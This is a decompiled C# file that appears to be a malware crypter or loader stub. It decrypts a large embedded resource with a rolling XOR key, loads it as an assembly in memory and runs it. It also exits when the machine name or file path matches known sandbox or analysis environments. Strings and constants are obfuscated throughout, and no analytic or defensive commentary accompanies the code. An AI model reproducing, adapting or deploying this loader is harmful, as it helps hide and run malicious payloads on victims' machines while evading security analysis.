using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;

public class GClass0
{
	public delegate uint GDelegate0(uint uint_0);

	public delegate int GDelegate1([MarshalAs(UnmanagedType.LPStruct)] Guid guid_0, uint uint_0, IntPtr intptr_0, [MarshalAs(UnmanagedType.LPWStr)] out string string_0);

	public delegate IntPtr GDelegate2(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, uint uint_1, uint uint_2, uint uint_3);

	public delegate bool GDelegate3(ref IntPtr ptr);

	public delegate IntPtr GDelegate4(int int_0, bool bool_0, int int_1);

	public delegate bool GDelegate5([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.LPWStr)] string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, uint uint_0, IntPtr intptr_2, string string_2, IntPtr intptr_3, byte[] byte_0);

	public delegate uint GDelegate6();

	public delegate int GDelegate7(IntPtr intptr_0, int int_0, IntPtr intptr_1, uint uint_0, IntPtr intptr_2);

	public delegate int GDelegate8(IntPtr intptr_0, ref IntPtr intptr_1, IntPtr intptr_2, ref IntPtr intptr_3, uint uint_0, uint uint_1);

	public delegate int GDelegate9(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, int int_0, IntPtr intptr_2);

	public delegate uint GDelegate10(IntPtr intptr_0, IntPtr intptr_1);

	public delegate int GDelegate11(IntPtr intptr_0, IntPtr intptr_1);

	public delegate int GDelegate12(IntPtr intptr_0, IntPtr intptr_1);

	public delegate int GDelegate13(IntPtr intptr_0, out uint uint_0);

	public delegate bool GDelegate14(IntPtr intptr_0, int int_0, int int_1, ref IntPtr intptr_1);

	public delegate bool GDelegate15(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2, IntPtr intptr_3, IntPtr intptr_4, IntPtr intptr_5);

	[STAThread]
	public static void Main(string[] args)
	{
		try
		{
			smethod_0();
		}
		catch
		{
		}
		try
		{
			string name = smethod_2(177, 195, 251, 214, 248, 224, 220, 233, 214, 217, 222, 201, 217, 252, 248, 193, 219, 211, 203, 133, 228, 129, 198, 228, 230, 254, 240, 221, 215, 218, 159, 195, 212, 194, 222, 196, 195, 210, 212, 194);
			string resourceName = smethod_2(182, 133, 213, 220, 133, 226, 249, 208, 236, 193, 244, 243, 255, 132, 252, 255, 134, 230, 223, 239, 130, 223, 133, 197, 192, 222, 134, 227);
			uint num = 3787115170u;
			uint num2 = 522479514u;
			int num3 = smethod_3(811449560, 221541514);
			using ResourceReader resourceReader = new ResourceReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
			resourceReader.GetResourceData(resourceName, out var _, out var resourceData);
			byte[] array = new byte[887296L];
			int i = smethod_3(1020586592, 29172275);
			int num4 = smethod_3(-848908691, -267426246);
			for (; i < 887296L; i++)
			{
				array[i] = (byte)(resourceData[num4++] ^ num);
				if ((num2 & 1) == 1)
				{
					num4 += num3;
				}
				num = ((num >> 5) | (num << 27)) * 7;
				num2 = (num2 >> 1) | (num2 << 31);
			}
			Assembly.Load(array).EntryPoint!.Invoke(null, new string[1][] { new string[1] { Environment.CommandLine }.Concat(args).ToArray() });
		}
		catch
		{
		}
	}

	public static void smethod_0()
	{
		GDelegate0 gDelegate = smethod_1<GDelegate0>(smethod_2(252, 151, 153, 142, 146, 153, 144, 207, 206, 210, 152, 144, 144), smethod_2(164, 247, 193, 208, 225, 214, 214, 203, 214, 233, 203, 192, 193));
		GDelegate2 gDelegate2 = smethod_1<GDelegate2>(smethod_2(66, 41, 39, 48, 44, 39, 46, 113, 112, 108, 38, 46, 46), smethod_2(181, 227, 220, 199, 193, 192, 212, 217, 244, 217, 217, 218, 214, 240, 205, 251, 192, 216, 212));
		byte[] array = new byte[smethod_3(-1005665182, -110688207) * smethod_3(-24847782, -1007872503) * smethod_3(-999862205, -116483980)];
		for (int i = smethod_3(-50552614, -1047172983); i < array.Length; i++)
		{
			array[i] = byte.MaxValue;
		}
		gDelegate((uint)smethod_3(-290088822, -740535079));
		if (gDelegate((uint)smethod_3(498820745, 550678234)) != smethod_3(644543579, 453195784))
		{
			Environment.Exit(smethod_3(-2003510591, -1241705838));
		}
		if (gDelegate2((IntPtr)smethod_3(1165740517, -2014446007), (IntPtr)smethod_3(-1793629455, -1468093790), (uint)smethod_3(-1985283958, -1262275791), (uint)smethod_3(1489268985, 1705871530), (uint)smethod_3(394803377, 719450342), (uint)smethod_3(-66626936, -1049718053)) == (IntPtr)smethod_3(1785262341, 1459698006))
		{
			Environment.Exit(smethod_3(1295867251, 1884591392));
		}
		if (Environment.MachineName == smethod_2(64, 14, 38, 26, 52, 6, 34, 16, 38, 8) || Environment.MachineName == smethod_2(53, 112, 121, 124, 118, 111) || Environment.MachineName == smethod_2(30, 106, 100) || Environment.MachineName == smethod_2(227, 174, 162, 170, 173))
		{
			Environment.Exit(smethod_3(-1532371269, -1715464472));
		}
		string location = Assembly.GetEntryAssembly()!.Location;
		if (location.Equals(smethod_2(142, 205, 180, 210, 202, 225, 237, 251, 227, 235, 224, 250, 253, 174, 239, 224, 234, 174, 221, 235, 250, 250, 231, 224, 233, 253, 210, 207, 234, 227, 231, 224, 231, 253, 250, 252, 239, 250, 225, 252, 210, 195, 247, 174, 202, 225, 237, 251, 227, 235, 224, 250, 253, 210, 227, 249, 253, 227, 254, 226, 160, 235, 246, 235), StringComparison.OrdinalIgnoreCase) || location.Equals(smethod_2(107, 40, 81, 55, 56, 46, 39, 45, 69, 46, 51, 46), StringComparison.OrdinalIgnoreCase) || Path.GetFileName(location)!.Equals(smethod_2(174, 195, 215, 207, 222, 222, 128, 203, 214, 203), StringComparison.OrdinalIgnoreCase))
		{
			Environment.Exit(smethod_3(654983451, 442730824));
		}
	}

	public static T smethod_1<T>(string string_0, string string_1)
	{
		return Marshal.GetDelegateForFunctionPointer<T>(GetProcAddress(LoadLibraryA(ref string_0), ref string_1));
	}

	public static string smethod_2(params ushort[] ushort_0)
	{
		return new string((from b in ushort_0.Skip(smethod_3(-1553767439, -1643467869))
			select (char)(b ^ ushort_0[smethod_3(691048529, 341399554)])).ToArray());
	}

	public static int smethod_3(int int_0, int int_1)
	{
		return int_0 ^ (int_1 ^ 0x3D69C853);
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);
}
